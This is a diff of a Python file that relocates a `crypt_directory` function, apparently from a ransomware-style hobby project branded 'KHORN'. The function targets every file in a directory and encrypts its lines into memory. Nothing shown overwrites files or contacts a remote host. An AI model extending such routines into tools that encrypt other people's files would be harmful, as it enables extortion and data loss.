@@ -48,6 +48,29 @@ def get_my_directory(path=__file__):
     return get_convert_str_to_path_list(path)
 
 
+def crypt_directory(directory):
+    res = {}
+
+    c = crypt.Crypt()
+
+    for name_file, file in directory.get_files():
+        print(f'<KHORN> SET TARGET TO FILE: {name_file}')
+        res[name_file] = ''
+
+        try:
+            for line in file:
+                line = replace_dict({'\n': '', '\t': ''}, line)
+
+                if line.isspace():
+                    continue
+
+                res[name_file] += c.crypt_mode(line)
+        except UnicodeDecodeError as _:
+            pass
+
+    return res
+
+
 class DirectoryReader:
     def __init__(self, path_directory=get_my_directory()):
         self.path_directory = path_directory
@@ -119,29 +142,6 @@ class DirectoryInspector:
                     print(f'<KHORN> IT\'S OK!')
             except UnicodeDecodeError as _:
                 continue
-
-
-def crypt_directory(directory: DirectoryReader):
-    res = {}
-
-    c = crypt.Crypt()
-
-    for name_file, file in directory.get_files():
-        print(f'<KHORN> SET TARGET TO FILE: {name_file}')
-        res[name_file] = ''
-
-        try:
-            for line in file:
-                line = replace_dict({'\n': '', '\t': ''}, line)
-
-                if line.isspace():
-                    continue
-
-                res[name_file] += c.crypt_mode(line)
-        except UnicodeDecodeError as _:
-            pass
-
-    return res
 
 
 if __name__ == '__main__':
